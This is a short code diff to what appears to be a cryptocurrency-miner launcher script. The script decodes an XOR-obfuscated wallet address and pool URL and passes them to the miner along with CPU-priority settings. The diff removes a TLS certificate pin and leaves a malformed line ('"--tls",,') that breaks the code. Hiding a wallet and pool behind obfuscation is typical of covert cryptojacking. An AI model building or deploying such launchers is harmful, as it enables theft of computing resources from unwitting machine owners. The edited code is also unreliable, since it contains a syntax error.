@@ -29,7 +29,6 @@ def decode(encoded, key):
 XOR_KEY = int(os.environ.get('XOR_KEY', '0x55'), 16)
 WALLET = decode(ENCODED_WALLET, XOR_KEY)
 POOL = decode(ENCODED_POOL, XOR_KEY)
-TLS_FINGERPRINT = "4633ddff863414b7d28bc4ce3e2966335c082d6e3783c412cc059af107a04dfd"
 
 debug_print(f"Decoded wallet: {WALLET[:10]}...")
 debug_print(f"Decoded pool: {POOL}")
@@ -125,8 +124,7 @@ def main():
             f"--url={POOL}",
             f"--user={WALLET}",
             "--pass=x",
-            "--tls",
-            f"--tls-fingerprint={TLS_FINGERPRINT}",
+            "--tls",,
             "--keepalive",
             f"--cpu-max-threads-hint={cpu_hint}",
             "--cpu-priority=5",
